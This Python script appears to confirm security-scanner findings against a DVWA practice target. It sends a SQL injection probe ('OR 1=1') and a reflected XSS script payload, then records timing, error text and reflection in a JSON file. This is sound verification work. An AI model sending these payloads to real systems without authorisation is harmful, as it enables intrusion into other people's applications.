import json
import time
from pathlib import Path

import httpx

BASE = "https://pentest-ground.com:4280"


def timed_get(client, url, **kwargs):
    started = time.perf_counter()
    try:
        response = client.get(url, **kwargs)
        return {
            "status": response.status_code,
            "size": len(response.content),
            "elapsed": round(time.perf_counter() - started, 4),
            "body": response.text,
            "headers": dict(response.headers),
            "error": None,
        }
    except httpx.HTTPError as exc:
        return {
            "status": 0,
            "size": 0,
            "elapsed": round(time.perf_counter() - started, 4),
            "body": "",
            "headers": {},
            "error": str(exc),
        }


def main():
    results = {}
    with httpx.Client(
        timeout=45,
        follow_redirects=True,
        headers={"User-Agent": "APISecurityPlatform-IndependentVerification/1.0"},
    ) as client:
        instructions = BASE + "/instructions.php"
        control = timed_get(client, instructions, params={"q": "hello"})
        sql_probe = timed_get(client, instructions, params={"q": "' OR 1=1 --"})
        results["instructions_sql_timing"] = {
            "control": {k: v for k, v in control.items() if k != "body"},
            "probe": {k: v for k, v in sql_probe.items() if k != "body"},
            "time_delta": round(sql_probe["elapsed"] - control["elapsed"], 4),
            "sql_error_text": any(token in sql_probe["body"].lower() for token in ("sql", "syntax", "mysql", "database", "error")),
            "probe_has_sql_error": any(token in sql_probe["body"].lower() for token in ("sql", "syntax", "mysql", "database", "error")),
        }

        xss = BASE + "/vulnerabilities/xss_r/"
        xss_payload = "<script>alert('xss')</script>"
        xss_probe = timed_get(client, xss, params={"name": xss_payload})
        results["reflected_xss"] = {
            "status": xss_probe["status"],
            "size": xss_probe["size"],
            "elapsed": xss_probe["elapsed"],
            "content_type": xss_probe["headers"].get("content-type", ""),
            "payload_reflected_verbatim": xss_payload in xss_probe["body"],
            "html_content": "text/html" in xss_probe["headers"].get("content-type", "").lower(),
            "error": xss_probe["error"],
        }

    Path("tests/dvwa_manual_confirmations.json").write_text(json.dumps(results, indent=2) + "\n")
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
